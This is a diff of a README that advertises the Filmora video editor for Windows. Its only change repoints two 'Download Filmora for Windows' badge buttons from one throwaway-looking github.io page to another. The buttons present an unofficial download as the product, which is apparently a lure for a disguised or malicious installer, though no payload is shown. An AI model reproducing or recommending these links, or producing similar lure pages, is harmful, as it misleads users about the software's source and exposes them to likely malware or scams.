@@ -16,7 +16,7 @@ Filmora is a video editing application for Windows that lets creators import foo
 <div align="center">
   <h3>Edit videos faster with a timeline, effects, and built-in audio mixing.</h3>
 
-  [![Download Filmora](https://img.shields.io/badge/⬇_Download_Filmora_for_Windows-2962FF?style=for-the-badge)](https://latonyachudyfjpek.github.io/.github/App-Filmora-Video)
+  [![Download Filmora](https://img.shields.io/badge/⬇_Download_Filmora_for_Windows-2962FF?style=for-the-badge)](https://dennisharris62.github.io/.github/App-Filmora-Video)
 
 </div>
 
@@ -89,7 +89,7 @@ For help with Filmora, open the in-app **Help** menu first — it links to produ
 <div align="center">
   <h3>Ready to get started with Filmora?</h3>
 
-  [![Download Filmora](https://img.shields.io/badge/⬇_Download_Filmora_for_Windows-2962FF?style=for-the-badge)](https://latonyachudyfjpek.github.io/.github/App-Filmora-Video)
+  [![Download Filmora](https://img.shields.io/badge/⬇_Download_Filmora_for_Windows-2962FF?style=for-the-badge)](https://dennisharris62.github.io/.github/App-Filmora-Video)
 
 </div>
 
